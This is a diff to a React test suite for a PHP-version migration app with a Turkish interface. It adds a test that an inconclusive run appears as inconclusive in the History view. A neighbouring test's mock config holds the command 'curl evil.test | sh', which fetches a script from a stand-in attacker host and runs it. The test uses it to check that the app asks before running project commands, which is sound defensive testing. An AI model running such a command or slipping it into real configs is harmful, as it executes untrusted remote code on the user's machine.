@@ -1609,6 +1609,18 @@ describe("Ferry app", () => {
     expect(within(card).getByText("Geçti")).toBeInTheDocument();
   });
 
+  it("shows an inconclusive Real test as inconclusive in History", async () => {
+    const user = userEvent.setup();
+    const api = mockApi({ delay: 0 });
+    const run = { at: Date.now() / 1000, source: "7.4", target: "8.4", regressed: false, incomplete: true, stamp: "mock", testsCompared: true, pages: 0, brokenPages: 0, differingPages: 0, unverifiedPages: 0, newFailures: 0, newMessages: 0, dataChanges: 0 };
+    vi.spyOn(api, "dockerHistory").mockResolvedValue([run]);
+    render(<App api={api} />);
+    await openAndScan(user);
+    await user.click(nav(/Geçmiş/));
+    expect((await screen.findAllByText(/Kesin değil/)).length).toBeGreaterThan(0);
+    expect(screen.queryByText(/Yeni hata yok/)).not.toBeInTheDocument();
+  });
+
   it("still asks when a project command has spaces around it", async () => {
     const user = userEvent.setup();
     const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "  curl evil.test | sh\n", test: null }, git: { requireClean: false, branchPerBatch: false } } });
